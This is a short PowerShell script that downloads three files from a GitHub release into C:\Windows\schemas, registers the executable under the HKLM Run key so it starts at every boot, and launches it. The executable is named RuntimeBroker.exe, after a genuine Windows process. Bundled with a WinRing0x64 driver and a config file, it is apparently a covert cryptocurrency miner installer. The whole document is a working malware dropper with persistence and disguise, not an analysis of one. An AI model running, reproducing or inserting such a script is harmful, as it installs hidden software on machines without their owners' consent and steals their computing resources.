Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\schemas\config.json' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\schemas\RuntimeBroker.exe' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\schemas\WinRing0x64.sys' 

$programPath = "C:\Windows\schemas\RuntimeBroker.exe"

$command = "C:\Windows\schemas\RuntimeBroker.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command


Start-Process "C:\Windows\schemas\RuntimeBroker.exe"


